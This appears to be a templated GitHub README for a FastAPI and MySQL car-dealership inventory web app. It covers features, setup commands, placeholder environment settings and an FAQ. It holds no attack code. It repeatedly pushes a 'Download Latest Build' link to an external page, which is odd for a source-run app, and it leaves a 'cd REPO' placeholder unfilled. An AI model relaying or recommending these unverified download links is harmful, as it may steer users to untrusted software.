# Apex Auto vLatest - Car Dealership Inventory System 2026

> **Apex Auto is a browser-based dealership inventory platform for maintaining vehicle data, handling purchase and restocking processes, and searching catalog records through a FastAPI and JavaScript application.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-vLatest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/oliver-bennettaqtj7727/apex-auto-dealership-inventory?style=flat-square)](https://github.com/oliver-bennettaqtj7727/apex-auto-dealership-inventory)

---

<p align="center">
  <a href="https://oliver-bennettaqtj7727.github.io/apex-auto-dealership-inventory/">
    <img src="https://img.shields.io/badge/Download-Apex%20Auto%20Latest-brightgreen?style=for-the-badge" alt="Download Apex Auto">
  </a>
</p>

> **[Download Apex Auto Latest](https://oliver-bennettaqtj7727.github.io/apex-auto-dealership-inventory/)**

---

[Download Latest Build](https://oliver-bennettaqtj7727.github.io/apex-auto-dealership-inventory/)

---

## About the Application

Apex Auto gives dealership personnel one place to manage vehicle inventory and keep catalog information easy to find. Through a responsive web interface, users can look up vehicles across several fields, inspect current stock, and track purchasing and restocking work.

The system is built around a Python FastAPI backend, a MySQL database layer, and a JavaScript single-page frontend styled with Tailwind CSS. JWT authentication and role-based permissions control access to available operations. REST endpoints, together with automated backend and frontend testing, provide a structured foundation for ongoing development and maintenance.

---

## Capabilities

- Find catalog entries through searches across multiple vehicle fields
- Keep vehicle records and dealership stock details current
- Log purchases and restocking events
- Perform administrative vehicle creation, review, editing, and deletion
- Secure API routes through JWT-based authentication
- Restrict application actions according to user roles
- Expose RESTful endpoints for the frontend and other services
- Deliver a responsive single-page experience with Tailwind CSS
- Support backend and frontend test suites built using TDD practices

---

## Getting Started

First, download the repository and enter its directory:

```bash
git clone https://github.com/oliver-bennettaqtj7727/apex-auto-dealership-inventory.git
cd REPO
```

Set up an isolated Python environment and install the server dependencies. A MySQL database must also be configured for the application:

```bash
python -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

PowerShell users can enable the virtual environment with:

```powershell
.venv\Scripts\Activate.ps1
```

Once the database and authentication configuration values are in place, run the FastAPI application from the project entry point:

```bash
uvicorn main:app --reload
```

Use the web entry point configured by the project to open the frontend, then confirm that it can communicate with the active API service.

---

## Working with Apex Auto

Use the following sequence for a normal local session:

1. Start MySQL and make sure the application database is accessible.
2. Run the FastAPI backend.
3. Load the single-page frontend in a browser.
4. Log in with an account that has appropriate authorization.
5. Search the catalog using the fields relevant to the vehicle.
6. Enter or modify inventory as vehicles are purchased or restocked.
7. Use vehicle CRUD controls when your role permits administrative actions.
8. Execute both test suites before contributing changes.

When calling protected REST endpoints directly, complete authentication first and include the returned JWT in the request header:

```http
Authorization: Bearer <jwt-token>
```

---

## Environment Configuration

Keep machine- and deployment-specific settings out of application source files. Use environment variables or the environment-file mechanism supported by the project. Example values include:

```env
DATABASE_URL=mysql+pymysql://user:password@localhost/apex_auto
JWT_SECRET_KEY=change-this-value
JWT_ALGORITHM=HS256
```

Replace these examples with values for the intended environment. When deploying or moving the application, verify the database connection, authentication configuration, and API startup settings.

---

## System Requirements

- A web browser with JavaScript enabled
- A Python version supported by the project dependencies
- A running MySQL database server
- FastAPI and the Python packages listed by the project
- Node.js tooling when needed for frontend builds or tests
- Connectivity between the frontend and REST API during development
- Sufficient storage for dependencies, database contents, and vehicle catalog records

---

## Frequently Asked Questions

### What teams use Apex Auto?

Apex Auto is designed for dealership staff who need searchable vehicle records plus processes for stock, purchasing, and restocking management.

### What is the process for changing inventory?

Log in with the necessary role, find the applicable vehicle record, and use the inventory or administrative controls available to your account.

### Where do database and authentication values belong?

Configure connection details and authentication settings through environment variables or the deployment configuration system. Do not place them directly in application source code.

### How does the API authorize requests?

Protected API operations use JWT authentication. Acquire a token through the application’s authentication flow and pass it in the `Bearer` authorization header.

### What should I check if the frontend has no backend connection?

Make sure FastAPI is running, the frontend is configured with the correct API address, MySQL is reachable, and all required environment settings have been loaded.

### How do I validate a modification?

Run the backend and frontend test suites, then inspect the affected catalog, inventory, or administrative flow manually in a browser.

### Where can I get the latest build?

Review the repository for current project updates and the newest build:

[Download Latest Build](https://oliver-bennettaqtj7727.github.io/apex-auto-dealership-inventory/)

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
